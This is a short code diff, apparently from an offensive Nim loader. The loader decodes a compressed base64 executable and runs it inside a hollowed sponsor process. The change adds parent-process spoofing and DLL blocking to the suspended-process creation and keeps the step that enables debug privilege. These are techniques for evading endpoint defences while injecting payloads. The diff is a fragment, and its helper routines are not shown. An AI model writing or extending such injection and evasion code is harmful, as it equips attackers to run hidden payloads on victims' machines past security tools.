@@ -3,7 +3,7 @@ import utils
 import params
 # External
 import os
-import winim/inc/windef
+import winim
 from std/base64 import decode
 from zip/zlib import uncompress
 
@@ -14,7 +14,7 @@ when defined(hollownimline):
     import hollowNimlineWhispers
 
 
-proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), sleepSeconds: int = 0): bool =
+proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), parentProcessName: string, isBlockDlls: bool, sleepSeconds: int = 0): bool =
 
     # Sleep at execution
     sleep(sleepSeconds * 1000)
@@ -26,11 +26,13 @@ proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), 
     # Enable debug privilege
     discard setDebugPrivilege()
     
+    var ppi: PPROCESS_INFORMATION = createSuspendedExtendedProcess(sponsorCmd, parentProcessName, isBlockDlls)
+
     # Execute module
     when defined(hollowsimple):
-        return simpleHollow(peStr, cast[LPCSTR](unsafeAddr sponsorCmd[0]))
+        return simpleHollow(peStr, ppi)
     when defined(hollownimline):
-        return nimlineHollow(peStr, cast[LPCSTR](unsafeAddr sponsorCmd[0]))
+        return nimlineHollow(peStr, ppi)
 
 
 proc main*() =
